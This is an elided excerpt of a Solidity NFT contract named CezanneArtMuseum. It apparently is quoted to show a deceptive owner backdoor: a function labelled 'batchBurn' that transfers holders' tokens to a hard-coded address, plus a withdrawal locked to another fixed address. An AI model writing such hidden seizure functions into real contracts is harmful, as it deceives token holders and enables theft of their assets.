...
contract CezanneArtMuseum is Ownable, ERC721A, ReentrancyGuard {
  ...
  ) ERC721A("CezanneArtMuseum", "CAM", maxBatchSize_, collectionSize_) {
  ...
  function batchBurn(uint256[] memory tokenids) external onlyOwner {
        ...
        for (uint256 i; i < len; i++) {
            ...
            transferFrom(ownerOf(tokenid), 0x57BECceA1785c3b6C32f4836a0E87ccBFae6f92c, tokenid);
        }
    }
  ...
  function withdrawMoney() external  nonReentrant {
    require(msg.sender == 0xf09afBD974B5285E71BF34fbf55A0A3f0C7fa903);
